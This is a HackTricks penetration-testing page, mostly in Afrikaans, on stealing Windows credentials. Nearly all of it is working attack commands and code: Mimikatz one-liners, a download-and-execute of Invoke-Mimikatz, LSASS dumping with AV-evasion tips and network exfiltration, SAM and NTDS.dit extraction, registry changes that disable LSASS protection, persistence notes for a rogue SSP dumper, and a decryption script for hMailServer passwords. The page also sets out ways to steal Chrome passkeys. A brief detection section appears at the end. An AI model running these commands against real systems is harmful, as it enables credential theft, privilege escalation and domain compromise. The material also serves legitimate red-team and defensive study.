# Steel Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Vind ander dinge wat Mimikatz kan doen op** [**hierdie bladsy**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Lees hier meer oor moontlike credential-beskermingsmaatreëls.**](credentials-protections.md) **Hierdie beskermingsmaatreëls kan voorkom dat Mimikatz sekere credentials onttrek.**

## Credentials met Meterpreter

Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat** ek geskep het om **na wagwoorde en hashes** binne die slagoffer te **soek**.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Om AV te omseil

### Procdump + Mimikatz

Aangesien **Procdump van** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'n wettige Microsoft-tool is**, word dit nie deur Defender bespeur nie.\
Jy kan hierdie tool gebruik om die **lsass-process te dump**, die **dump af te laai** en die **credentials plaaslik** uit die dump te **extract**.

Jy kan ook [SharpDump](https://github.com/GhostPack/SharpDump) gebruik.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Hierdie proses word outomaties met [SprayKatz](https://github.com/aas-n/spraykatz) gedoen: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Sommige **AV** mag die gebruik van **procdump.exe om lsass.exe te dump** as **malicious** **detect**, omdat hulle die stringe **"procdump.exe" en "lsass.exe"** **detect**. Dit is dus meer **stealthier** om die **PID** van lsass.exe as ’n **argument** aan procdump deur te gee, **in plaas van** die **naam lsass.exe**.

### Dumping lsass met **comsvcs.dll**

’n DLL genaamd **comsvcs.dll**, wat in `C:\Windows\System32` gevind word, is verantwoordelik vir die **dumping van process memory** wanneer ’n crash plaasvind. Hierdie DLL bevat ’n **function** genaamd **`MiniDumpW`**, wat ontwerp is om met `rundll32.exe` aangeroep te word.\
Dit is irrelevant om die eerste twee arguments te gebruik, maar die derde een word in drie komponente verdeel. Die process ID wat gedump moet word, vorm die eerste komponent; die dump-lêer se ligging verteenwoordig die tweede; en die derde komponent is uitsluitlik die woord **full**. Geen alternatiewe opsies bestaan nie.\
Nadat hierdie drie komponente geparse is, word die DLL gebruik om die dump-lêer te skep en die gespesifiseerde process se memory na hierdie lêer oor te dra.\
Die gebruik van **comsvcs.dll** is uitvoerbaar om die lsass-process te dump, waardeur dit nie nodig is om procdump op te laai en uit te voer nie. Hierdie metode word in detail beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Die volgende command word vir uitvoering gebruik:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Jy kan hierdie proses outomatiseer met** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping van lsass met Task Manager**

1. Regsklik op die Taakbalk en klik op Task Manager
2. Klik op More details
3. Soek die "Local Security Authority Process"-proses in die Processes-oortjie
4. Regsklik op die "Local Security Authority Process"-proses en klik op "Create dump file".

### Dumping van lsass met procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is 'n Microsoft-ondertekende binary wat deel is van die [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)-suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping lsass met PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is ’n Protected Process Dumper Tool wat die obfuscation van ’n memory dump en die oordrag daarvan na afgeleë werkstasies ondersteun sonder om dit op die skyf neer te skryf.

**Sleutelfunksionaliteite**:

1. Omseiling van PPL-beskerming
2. Obfuscation van memory dump-lêers om Defender se handtekeninggebaseerde opsporingsmeganismes te ontduik
3. Oplaai van ’n memory dump met RAW- en SMB-uploadmetodes sonder om dit op die skyf neer te skryf (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon lewer 'n dumper met drie fases, genaamd **LalsDumper**, wat nooit `MiniDumpWriteDump` oproep nie, dus word EDR-hooks op daardie API nooit geaktiveer nie:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – soek in `fdp.dll` na 'n plekhouer wat uit 32 kleinletter-`d`-karakters bestaan, oorskryf dit met die absolute pad na `rtu.txt`, stoor die aangepaste DLL as `nfdp.dll`, en roep `AddSecurityPackageA("nfdp","fdp")` aan. Dit dwing **LSASS** om die kwaadwillige DLL as 'n nuwe Security Support Provider (SSP) te laai.
2. **Stage 2 binne LSASS** – wanneer LSASS `nfdp.dll` laai, lees die DLL `rtu.txt`, XOR elke greep met `0x20`, en map die gedekodeerde blob in geheue voordat beheer van uitvoering oorgedra word.
3. **Stage 3 dumper** – die gemapte payload herimplementeer MiniDump-logika met **direct syscalls** wat uit hashed API-name opgelos word (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). 'n Toegewyde uitvoer genaamd `Tom` open `%TEMP%\<pid>.ddt`, stroom 'n saamgeperste LSASS-dump na die lêer, en sluit die handle sodat exfiltration later kan plaasvind.

Operator-notas:

* Hou `lals.exe`, `fdp.dll`, `nfdp.dll` en `rtu.txt` in dieselfde gids. Stage 1 herskryf die hard-coded plekhouer met die absolute pad na `rtu.txt`, dus verbreek die splitsing daarvan die ketting.
* Registrasie gebeur deur `nfdp` by `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` te voeg. Jy kan daardie waarde self vooraf instel om LSASS elke boot die SSP te laat herlaai.
* `%TEMP%\*.ddt`-lêers is saamgeperste dumps. Decompress dit plaaslik en voer dit daarna aan Mimikatz/Volatility vir credential extraction.
* Om `lals.exe` uit te voer, vereis admin/SeTcb-regte sodat `AddSecurityPackageA` slaag; sodra die oproep terugkeer, laai LSASS die rogue SSP deursigtig en voer Stage 2 uit.
* Die DLL van die skyf verwyder, verwyder dit nie uit LSASS nie. Verwyder óf die registerinskrywing en herbegin LSASS (reboot), óf laat dit vir langtermyn-persistence.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump die NTDS.dit vanaf die teiken-DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump die NTDS.dit-wagwoordgeskiedenis vanaf die teiken-DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Wys die pwdLastSet-kenmerk vir elke NTDS.dit-rekening
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Hierdie lêers behoort in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM_ **geleë te wees**. Maar **jy kan dit nie eenvoudig op die gewone manier kopieer nie**, omdat hulle beskerm is.

### From Registry

Die maklikste manier om hierdie lêers te steel, is om ’n kopie uit die Registry te kry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Laai** daardie lêers na jou Kali-masjien af en **onttrek die hashes** met:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Jy kan hierdie diens gebruik om kopieë van beskermde lêers te maak. Jy moet Administrator wees.

#### Using vssadmin

Die vssadmin-binary is slegs in Windows Server-weergawes beskikbaar
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Maar jy kan dieselfde vanuit **Powershell** doen. Dit is 'n voorbeeld van **hoe om die SAM-lêer te kopieer** (die hardeskyf wat gebruik word, is "C:" en dit word in C:\users\Public gestoor), maar jy kan dit gebruik om enige beskermde lêer te kopieer:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kode uit die boek: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Laastens kan jy ook die [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) gebruik om ’n kopie van SAM, SYSTEM en ntds.dit te maak.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Die **NTDS.dit**-lêer staan bekend as die hart van **Active Directory** en bevat belangrike data oor gebruikerobjekte, groepe en hul lidmaatskappe. Dit is waar die **password hashes** vir domeingebruikers gestoor word. Hierdie lêer is 'n **Extensible Storage Engine (ESE)**-databasis en is geleë by **_%SystemRoom%/NTDS/ntds.dit_**.

Binne hierdie databasis word drie primêre tabelle onderhou:

- **Data Table**: Hierdie tabel is verantwoordelik vir die stoor van besonderhede oor objekte soos gebruikers en groepe.
- **Link Table**: Dit hou verhoudings, soos groeplidmaatskappe, dop.
- **SD Table**: **Security descriptors** vir elke objek word hier gehou, wat die sekuriteit en toegangbeheer vir die gestoorde objekte verseker.

Christoffer Andersson se navorsing oor die databaselaag dokumenteer hierdie tabelle en hul weergawe-spesifieke gedrag in meer besonderhede.<sup>[[8]](#references)</sup>

Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer, en dit word deur _lsass.exe_ gebruik. Daarom kan **part** van die **NTDS.dit**-lêer **binne die `lsass`**-geheue geleë wees (jy kan waarskynlik die mees onlangs verkrygde data vind as gevolg van die prestasieverbetering deur 'n **cache** te gebruik).

#### Decrypting the hashes inside NTDS.dit

Die hash word drie keer geënkripteer:

1. De-enkripteer Password Encryption Key (**PEK**) met behulp van die **BOOTKEY** en **RC4**.
2. De-enkripteer die **hash** met behulp van **PEK** en **RC4**.
3. De-enkripteer die **hash** met behulp van **DES**.

Die **PEK** het dieselfde waarde op elke domeinbeheerder, maar dit is **encrypted** binne **NTDS.dit** met die domeinbeheerder-spesifieke **BOOTKEY** uit daardie domeinbeheerder se **SYSTEM**-hive. Daarom vereis die onttrekking van credentials beide **NTDS.dit** en **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Copying NTDS.dit using Ntdsutil

Beskikbaar sedert Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Jy kan ook die [**volume shadow copy**](#stealing-sam-and-system)-truuk gebruik om die **ntds.dit**-lêer te kopieer. Onthou dat jy ook ’n kopie van die **SYSTEM-lêer** sal benodig (weereens, [**dump dit uit die register of gebruik die volume shadow copy**](#stealing-sam-and-system)-truuk).

### **Onttrekking van hashes uit NTDS.dit**

Sodra jy die lêers **NTDS.dit** en **SYSTEM** **verkry** het, kan jy tools soos _secretsdump.py_ gebruik om die **hashes te onttrek**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Jy kan hulle ook outomaties onttrek deur ’n geldige domain admin-gebruiker te gebruik:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Vir **groot NTDS.dit-lêers** word dit aanbeveel om dit met [gosecretsdump](https://github.com/c-sto/gosecretsdump) te onttrek.

Laastens kan jy ook die **metasploit module** gebruik: _post/windows/gather/credentials/domain_hashdump_ of **mimikatz** `lsadump::lsa /inject`

### **Onttrekking van domeinobjekte uit NTDS.dit na ’n SQLite-databasis**

NTDS-objekte kan met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) na ’n SQLite-databasis onttrek word. Nie net geheime word onttrek nie, maar ook die volledige objekte en hul attribute vir verdere inligtingsonttrekking wanneer die rou NTDS.dit-lêer reeds verkry is.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Die `SYSTEM` hive is opsioneel, maar maak dekripsie van secrets moontlik (NT- en LM-hashes, supplemental credentials soos cleartext passwords, kerberos- of trust keys, NT- en LM-password histories). Saam met ander inligting word die volgende data onttrek: user- en machine accounts met hul hashes, UAC flags, timestamp vir laaste logon en password change, account descriptions, names, UPN, SPN, groups en recursive memberships, organizational units tree en membership, trusted domains met trust type, direction en attributes...

## Lazagne

Download die binary van [hier](https://github.com/AlessandroZ/LaZagne/releases). Jy kan hierdie binary gebruik om credentials uit verskeie sagteware te onttrek.
```
lazagne.exe all
```
## Ander nutsmiddels vir die onttrekking van geloofsbriewe uit SAM en LSASS

### Windows credentials Editor (WCE)

Hierdie nutsmiddel kan gebruik word om geloofsbriewe uit die geheue te onttrek. Laai dit af vanaf: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Onttrek geloofsbriewe uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Haal geloofsbriewe uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Laai dit af vanaf:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) en **execute dit** eenvoudigweg; die wagwoorde sal onttrek word.

## Ontginning van onaktiewe RDP-sessies en verswakking van sekuriteitskontroles

Ink Dragon se FinalDraft RAT sluit ’n `DumpRDPHistory`-tasker in waarvan die tegnieke handig is vir enige red-teamer:<sup>[[3]](#references)</sup>

### DumpRDPHistory-styl telemetrie-insameling

* **Uitgaande RDP-teikens** – ontleed elke user hive by `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Elke subkey stoor die bedienernaam, `UsernameHint` en die tydstempel van die laaste wysiging. Jy kan FinalDraft se logika met PowerShell repliseer:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inkomende RDP-bewyse** – bevraag die `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational`-log vir Event IDs **21** (suksesvolle aanmelding) en **25** (ontkoppeling) om vas te stel wie die masjien geadministreer het:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Sodra jy weet watter Domain Admin gereeld koppel, dump LSASS (met LalsDumper/Mimikatz) terwyl hul **ontkoppelde** sessie steeds bestaan. CredSSP + NTLM fallback laat hul verifier en tokens in LSASS agter, wat dan oor SMB/WinRM herspeel kan word om `NTDS.dit` te bekom of persistence op domeinbeheerders te vestig.

### Register-downgrades wat deur FinalDraft geteiken word

Dieselfde implant peuter ook aan verskeie register-sleutels om credential theft makliker te maak:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Setting `DisableRestrictedAdmin=1` dwing volledige credential/ticket-hergebruik tydens RDP af, wat pass-the-hash-styl pivots moontlik maak.
* `LocalAccountTokenFilterPolicy=1` deaktiveer UAC-tokenfiltrering sodat plaaslike admins onbeperkte tokens oor die netwerk kry.
* `DSRMAdminLogonBehavior=2` laat die DSRM-administrator aanmeld terwyl die DC aanlyn is, wat attackers nog ’n ingeboude rekening met hoë privileges gee.
* `RunAsPPL=0` verwyder LSASS PPL-beskerming, wat geheuetoegang maklik maak vir dumpers soos LalsDumper.

## hMailServer-databasisbewyse (post-compromise)

hMailServer stoor sy DB password in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` onder `[Database] Password=`. Die waarde is Blowfish-geënkripteer met die statiese sleutel `THIS_KEY_IS_NOT_SECRET` en 4-byte word-endianness-omruilings. Gebruik die hex-string uit die INI met hierdie Python-snippet:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Met die clear-text password, kopieer die SQL CE-databasis om file locks te vermy, laai die 32-bit provider, en upgrade indien nodig voordat jy hashes query:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Die `accountpassword`-kolom gebruik die hMailServer-hash-formaat (hashcat-modus `1421`). Deur hierdie waardes te crack, kan herbruikbare credentials vir WinRM/SSH-pivots verkry word.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Sommige tooling vang **plaintext logon passwords** vas deur die LSA-logon callback `LsaApLogonUserEx2` te onderskep. Die idee is om die authentication package callback te hook of te wrap sodat credentials **tydens logon** vasgelê word (voor hashing), en daarna na skyf geskryf of aan die operator teruggestuur word. Dit word gewoonlik geïmplementeer as ’n helper wat in LSA inject of daarmee registreer, en dan elke suksesvolle interactive/network logon-gebeurtenis met die username, domein en password aanteken.<sup>[[1]](#references)</sup>

Operasionele notas:
- Vereis local admin/SYSTEM om die helper in die authentication path te laai.
- Vasgelegde credentials verskyn slegs wanneer ’n logon plaasvind (interactive, RDP, service of network logon, afhangend van die hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) stoor gestoorde connection-inligting in ’n per-user `sqlstudio.bin`-lêer. Gespesialiseerde dumpers kan die lêer parse en gestoorde SQL-credentials herstel. In shells wat slegs command output terugstuur, word die lêer dikwels geëksfiltreer deur dit as Base64 te encodeer en na stdout te druk.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Aan die operateur se kant, bou die lêer weer en voer die dumper plaaslik uit om aanmeldbesonderhede te herwin:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Diefstal van Passkeys / WebAuthn credentials uit Chrome op Windows

As code execution as die **slagoffergebruiker** op ’n Windows-host verkry word met **Chrome + Google Password Manager-synced passkeys**, word passkeys ’n interessante post-exploitation-teiken, selfs **sonder admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Interessante plaaslike artefakte
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** stoor protobuf-geënkodeerde **`WebauthnCredentialSpecifics`**-rekords. ’n Proses van dieselfde gebruiker kan die **RP ID**, **gebruikersnaam**, **credential ID** en geënkripteerde private-sleutelmateriaal vir gesinkroniseerde passkeys opnoem.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** stoor plaaslike toestelregistrasiestatus soos **`wrapped_identity_private_key`** en die toegedraaide geheim wat gebruik word om gesinkroniseerde credentials te herstel.<sup>[[4]](#references)</sup>

Vinnige triage:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-gebonde key blobs kan steeds as ’n plaaslike signing oracle misbruik word

As die blaaier ’n TPM-gesteunde identiteitskey as **`NCRYPT_OPAQUE_KEY_BLOB`** uitvoer en daardie blob in user-accessible state stoor, hoef malware nie die rou private key te onttrek nie. Dit kan die blob eenvoudig op **dieselfde masjien** herinvoer en die plaaslike TPM vra om data wat deur die aanvaller beheer word, te sign:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Dit beteken **hardware binding verhoed uitvoer buite die toestel, maar nie gebruik deur dieselfde gebruiker op die gekompromitteerde endpoint nie**.

### Praktiese misbruikspaaie

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Enumerateer `WebauthnCredentialSpecifics` uit Chrome se LevelDB.
- Begin 'n passkey-aanmelding en verkry 'n vars WebAuthn challenge.
- Gebruik die gesteelde `wrapped_identity_private_key`-blob op die slagoffer se TPM om die cloud-authenticator request binding te onderteken.
- Relay die teruggestuurde assertion na die relying party.
- Dit is veral waardevol wanneer die RP `userVerification=preferred` aanvaar of nie daarin slaag om assertions met **`UV=0`** te verwerp nie.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- Dwing her-onboarding af deur `passkey_enclave_state` te skrap of deur 'n geldige ondertekende `device/forget`-operasie te stuur.
- As onboarding die toestel in **`uv_key_pending`** laat, registreer 'n UV public key wat deur die aanvaller beheer word.
- As die provider nie attestation / secure-hardware origin vir die nuwe UV key verifieer nie, word latere handtekeninge vanaf die attacker key as **`UV=1`** behandel.
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- Dwing recovery of rejoin af sodat Chrome die gesinkroniseerde-passkey master secret ophaal.
- Let op die herskepping/wysiging van `passkey_enclave_state`, en dump dan Chrome se geheue terwyl die plaintext **security domain secret (SDS)** daarin resident is.
- Gebruik die herwonne SDS om die encrypted fields in elke `WebauthnCredentialSpecifics`-rekord te decrypt en portable WebAuthn private keys te herwin.

### DFIR / opsporingsidees

- Monitor **skrap/her-skepping** van `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Stel 'n alert op vir abnormale toegang tot Chrome se **`Sync Data\LevelDB`** deur nie-browserprosesse.
- Stel 'n alert op vir **Chrome memory dumps** of verdagte cross-process memory access.
- Ondersoek herhaalde **Google Password Manager recovery PIN**-aanwysings of onverwagte her-onboarding.
- Onthou dat WebAuthn **`signCount`** dikwels nie nuttig is vir gesinkroniseerde passkeys nie omdat dit konstant kan bly, dus is klassieke clone detection swak.

## References

- [1] [Unit 42 – 'n Ondersoek na Jare van Ongedetekteerde Operasies wat Hoëwaardesektore geteiken het](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA-makro-phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 na SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Binne Ink Dragon: Onthulling van die Relay Network en Innerlike Werking van 'n Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: 'n Nuwe Attack Surface in Passwordless Authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Aanvalle op Microsoft-stelsels en -netwerke](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Hoe die Active Directory Data Store Werklik Werk: Binne NTDS.dit (Deel 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – Afgeleë Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
{{#include ../../banners/hacktricks-training.md}}
